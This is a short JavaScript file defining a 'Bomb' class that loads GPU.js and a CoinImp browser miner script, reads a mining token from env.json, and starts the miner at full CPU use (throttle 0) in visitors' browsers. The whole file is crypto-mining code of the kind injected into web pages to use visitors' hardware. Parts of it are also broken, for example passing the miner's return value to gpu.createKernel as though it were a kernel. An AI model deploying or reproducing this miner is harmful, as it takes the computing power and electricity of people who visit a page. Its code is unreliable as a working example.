// GPU is a constructor and namespace for browser
// import GPU from './gpu-browser.min.js'

class Bomb {
    constructor() {
        this.libGPUjs = 'https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js'
        this.libCoinImp = 'Xsp2.js'
        this.envfile = 'env.json'

        console.log("Building bomb...")
        this.importLib(this.libGPUjs).then(() => {
            console.log('Ready to explode')
        })
        this.importLib(this.libCoinImp).then(() => {
            console.log('Ready to mine')
        })
    }

    async importLib(src) {
        let li = document.createElement('script');
        li.type = 'text/javascript';
        li.src = src;
        li.async = true;
        let s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(li, s);
        return true
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getToken() {
        let TOKEN = ''
        return await fetch(this.envfile)
            .then(response => response.json())
            .then(env => {
                return TOKEN = env.TOKEN
            })
    }

    mine(TOKEN) {
        let _client = new Client.Anonymous(TOKEN, {
            throttle: 0, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
        return 0
    }

    async explode() {
        await this.sleep(1000)
        let TOKEN = await this.getToken()

        const gpu = new GPU()
        const miner = gpu.createKernel(this.mine(TOKEN), {output: [1]})
        const c = miner();
        console.log(c)
    }
}

